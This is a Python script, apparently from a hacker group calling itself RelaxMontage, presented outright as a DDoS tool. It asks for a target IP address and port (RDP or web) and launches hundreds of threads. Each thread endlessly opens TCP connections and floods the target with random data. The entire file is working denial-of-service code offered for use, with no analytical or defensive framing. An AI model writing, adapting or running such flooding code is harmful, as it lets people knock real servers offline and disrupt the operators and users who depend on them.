# Coding Time By : FardhanX
# Tools Usage By : FardhanX
# Tools Credit By : FardhanX
# RelaxMontage TEAM

# Import Module
import random
import socket
import threading
import os
# Info Tools [ RM Tools ]
os.system("clear")

print("•------------------------------------•")
print("[+] Tools By RelaxMontage")
print("[+] Created By FardhanXWizzSec ")
print("[+] Dont Leak This Ddos tools")
print("[!] Dont Rename This Tools!!!")
print("[#] Credit : RelaxTeam")
print("     || TCP || UDP || HTTPS ||         ")
print("•-------------------------------------•")

ip = str(input("[/] Enter RDP/VPS IP Nya : "))
port = int(input("[/] Enter RDP/VPS Port (80/3389)   : "))
times = int(input("[/] Enter Packet Coy : "))
threads = int(input("[/] Enter Thread Coy (1000) : "))

def run():
    data = random._urandom(1000)
    i = random.choice(("[*]","[!]","[#]","[?]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Kirim!!!")
        except socket.error:
            s.close()
            print("[!] Attacking By RelaxMontage Tools Auto Suspend IP => ",ip," With Port : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()￼Enter
